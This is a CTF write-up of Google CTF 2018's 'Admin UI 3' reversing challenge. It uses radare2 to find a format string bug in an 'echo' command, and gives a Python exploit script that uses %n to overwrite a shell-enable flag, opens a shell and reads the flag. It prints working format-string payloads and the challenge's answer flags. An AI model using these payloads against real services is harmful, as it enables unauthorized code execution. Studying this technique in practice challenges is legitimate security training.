---
layout: article
title: Reversing with Radare2 - Google CTF 2018 - Part 3
permalink: /page/reversing-with-radare2-part-3
key: page-article-header-overlay-background-image-HB
cover: /assets/images/thumbs/reversing-with-radare2-part-1.png
header:
  theme: dark
  background: 'linear-gradient(135deg, rgb(195, 55, 100), rgb(29, 38, 113))'
article_header:
  type: overlay
  theme: dark
  background_color: '#0F2027'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(195, 55, 100, .6), rgba(29, 38, 113, .6))'
    src: /assets/images/posts/reversing-with-radare2-part-1/cover.png
---

Tackling reverse engineering challenges in Google CTF Beginners Quest with Radare2 (Admin UI 3).

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>


## Admin UI 3

<img src="/assets/images/posts/reversing-with-radare2-part-3/node.png" alt="" class="center" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/75.png" alt="" class="center">

This time, our challenge prompt hints at some sort of memory error. Perhaps we can trigger an overflow of some sort. Let's use the flag we obtained from Admin UI 2 authenticate with the management interface.

```bash
root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1
Please enter the backdoo^Wservice password:
CTF{I_luv_buggy_sOFtware}
! Two factor authentication required !
Please enter secret secondary password:
CTF{Two_PasSworDz_Better_th4n_1_k?}
Authenticated
> ls
Unknown command 'ls'
> 
```

Using our flags, we've authenticated successfully with the server, but we don't know what commands are accepted. If we take a look at the functions within <b>main</b> using <code>radare2</code> again, perhaps we can make some progress.

```bash
root@kali:~/google-ctf-2018/admin-ui# r2 main
[0x41414150]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
[0x41414150]> vv
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/76.png" alt="" class="center">

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/77.png" alt="" class="center">

The <b>command_line__</b> function looks interesting. Trying some of the string variables found within the instructions after we've authenticated with the management interface gets us better results.

```bash
root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1
Please enter the backdoo^Wservice password:
CTF{I_luv_buggy_sOFtware}
! Two factor authentication required !
Please enter secret secondary password:
CTF{Two_PasSworDz_Better_th4n_1_k?}
Authenticated
> version
Version 0.3
> shell
Security made us disable the shell, sorry!
> 
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/78.png" alt="" class="center">

We can follow the function calls more easily by using graph view.

```bash
[0x41414150]> s 0x4141428e
[0x4141428e]> VV
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/79.png" alt="" class="center">

Within graph view, we see that after typing "shell", there is a byte with value 0 being moved from address <b>0x41616138</b> into <b>eax</b>. However, we want that byte to have value 1 so that when xor'ed with 1 in the next instruction, <b>al</b> is then set to 0. Then, <code>test al, al</code> would set the ZF causing <code>je 0x41414349</code> to trigger successfully. This enables us to trigger a debug shell. 

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/80.png" alt="" class="center">

So how do we go about changing the value stored in <b>0x41616138</b>? We can see from the graph view that the "echo" command uses <code>printf</code> to echo the contents of our input back to console. Maybe there is a format string vulnerability we can take advantage of here.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/81.png" alt="" class="center">


```bash
root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1
Please enter the backdoo^Wservice password:
CTF{I_luv_buggy_sOFtware}
! Two factor authentication required !
Please enter secret secondary password:
CTF{Two_PasSworDz_Better_th4n_1_k?}
Authenticated
> echo "BBBBBBBBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"
"BBBBBBBBBB 41414ac3 4 3 4f515740 2 0 0 0 0 0 0 0 0 0 0 74464f73 e08c007d 0 0 0 0 0 0 4ea52780 4e704bff 4ea51620 1 4ea516a3 e08c9e50 0 4e706409 d 4ea51620 a 41414b86 e08c9e50 4e70681b 6f686365 42424242 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 227825 0 0 e08c9d70 4e6f687b 0 8 e08c9b90 e08c9ad0 0"
```

Using the format string vulnerability in <code>printf</code>, we were able to print the addresses that this <code>printf</code> function is retrieving parameters from. We can pinpoint the exact location that we overwrite with B's by counting the number of address fields before we hit "<b>42424242</b>" in the echo'ed contents. If we want to avoid straining our eyes, we can create a simple script to count the fields for us.

The following python script generates a string to pass into the echo command that will show us the parameter number and the corresponding addresses <code>printf</code> is retrieving the parameters from.

<b>echo.py</b>
```py
#!/usr/bin/python


addresses = "".join([str(i) + ": %x  " for i in range(2,51)])

print("{0} {1}".format("BBBBBBBBBB", addresses))
```

```bash
root@kali:~/google-ctf-2018/admin-ui# python echo.py 
BBBBBBBBBB 2: %x  3: %x  4: %x  5: %x  6: %x  7: %x  8: %x  9: %x  10: %x  11: %x  12: %x  13: %x  14: %x  15: %x  16: %x  17: %x  18: %x  19: %x  20: %x  21: %x  22: %x  23: %x  24: %x  25: %x  26: %x  27: %x  28: %x  29: %x  30: %x  31: %x  32: %x  33: %x  34: %x  35: %x  36: %x  37: %x  38: %x  39: %x  40: %x  41: %x  42: %x  43: %x  44: %x  45: %x  46: %x  47: %x  48: %x  49: %x  50: %x 
```

We copy this string and pass it into the authenticated management console via <code>echo</code>. What we get back is now the same list of addresses as before, except with their corresponding parameter numbers conveniently displayed.  


```bash
> echo "BBBBBBBBBB 2: %x  3: %x  4: %x  5: %x  6: %x  7: %x  8: %x  9: %x  10: %x  11: %x  12: %x  13: %x  14: %x  15: %x  16: %x  17: %x  18: %x  19: %x  20: %x  21: %x  22: %x  23: %x  24: %x  25: %x  26: %x  27: %x  28: %x  29: %x  30: %x  31: %x  32: %x  33: %x  34: %x  35: %x  36: %x  37: %x  38: %x  39: %x  40: %x  41: %x  42: %x  43: %x  44: %x  45: %x  46: %x  47: %x  48: %x  49: %x  50: %x "
"BBBBBBBBBB 2: 41414ac3  3: 4  4: 3  5: 4fde1740  6: 2  7: 0  8: 0  9: 0  10: 0  11: 0  12: 0  13: 0  14: 0  15: 0  16: 0  17: 0  18: 0  19: 74464f73  20: 26c5007d  21: 0  22: 0  23: 0  24: 0  25: 0  26: 4efd0bff  27: 4f31d620  28: 1  29: 4f31d6a3  30: 26c5dde0  31: 0  32: 4efd2409  33: d  34: 4f31d620  35: a  36: 41414b86  37: 26c5dde0  38: 4efd281b  39: 6f686365  40: 42424242  41: 203a3220  42: 25203a33  43: 7825203a  44: 20782520  45: 20207825  46: 38202078  47: 3a392020  48: 3a303120  49: 3a313120  50: 3a323120 "
```

We can see that at parameter 40, we have our overwrite of B's in memory. If we print the contents of the address around that area using the format string command below, we can identify that in our echo command, we will be overwriting what comes after our first character ("B") with "DEFG...." in our command. This is indicated by the hex values: "4b4a494847464544".

```bash
> "echo B%40$llxABCDEFGHIJKL"
"B4b4a494847464544ABCDEFGHIJKL"
```

Here is a breakdown of how our format string works (see <a href="https://en.wikipedia.org/wiki/Printf_format_string" target="_blank">wikipedia</a>):
```
B%40$llxABCDEFGHIJKL

"B" = one byte which we only need for when we use %n (see %n)
"%" = format string prefix needed for "llx" (see llx)
"40$ = parameter number in printf to display
"ll" = causes the length field in printf to expect a long long int
"x" = specifies type as hexadecimal number
"ABCDEFGHIJKL" = used indicate the exact boundaries of the overwrite in our echo command
                 we need to replace this with the address we want to write to


"%n" = writes the number of characters successfully written so far into an integer pointer parameter 
```

Later, we will be replacing the "x" in our <code>echo</code> string with "n" so we can write a number to <b>0x41616138</b>. At this point, we can check to see if we are writing the correct address in the correct location with the following python script adapted from:
<a href="https://github.com/gynvael/stream-en/blob/master/025-blind-rop/prestream_version/pwnbase.py" target="_blank">https://github.com/gynvael/stream-en/blob/master/025-blind-rop/prestream_version/pwnbase.py</a>

<b>exploit.py</b>
```py
#!/usr/bin/python

import socket
import telnetlib
import struct

HOST = "mngmnt-iface.ctfcompetition.com"
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))


s.sendall("1\n")
s.sendall("CTF{I_luv_buggy_sOFtware}\n")
s.sendall("CTF{Two_PasSworDz_Better_th4n_1_k?}\n")

s.sendall("echo B%40$llxABC" + struct.pack("<Q",0x0000000041616138) + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

Launching the script confirms our address overwrite.

```bash
root@kali:~/google-ctf-2018/admin-ui# python exploit.py 
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
Please enter the backdoo^Wservice password:
! Two factor authentication required !
Please enter secret secondary password:
Authenticated
> B41616138ABC8aaA
```

As mentioned before, if we change the "x" in our <code>echo</code> command to "n", the contents of <b>0x41616138</b> will be overwritten with the number of bytes we've written so far with <code>echo</code>. Doing so will alter the <b>shell_enabled</b> variable seen in our graph view to no longer contain "0". When this happens, we should be able to trigger a shell.

Our echo command now looks like the following:
```py
s.sendall("echo B%40$llnABC" + struct.pack("<Q",0x0000000041616138) + "\n")
```

If we execute the modified script, we should be able to trigger a shell.


```bash
root@kali:~/google-ctf-2018/admin-ui# python exploit.py 
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
Please enter the backdoo^Wservice password:
! Two factor authentication required !
Please enter secret secondary password:
Authenticated
> BABC8aaA
> shell
ls -la
total 144
drwxr-xr-x 3 user   user      4096 Oct 24 19:06 .
drwxr-xr-x 3 nobody nogroup   4096 Oct 16 15:10 ..
-rw-r--r-- 1 user   user       220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 user   user      3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 user   user       655 May 16  2017 .profile
-rw-r--r-- 1 nobody nogroup     26 Sep 26 15:44 an0th3r_fl44444g_yo
-rw-r--r-- 1 nobody nogroup     25 Sep 26 15:44 flag
-rwxr-xr-x 1 nobody nogroup 111128 Sep 26 15:44 main
drwxr-xr-x 2 nobody nogroup   4096 Oct 24 19:06 patchnotes
cat an0th3r_fl44444g_yo
CTF{c0d3ExEc?W411_pL4y3d}
```

<br>
<br>
### Solution
<b>CTF{c0d3ExEc?W411_pL4y3d}</b>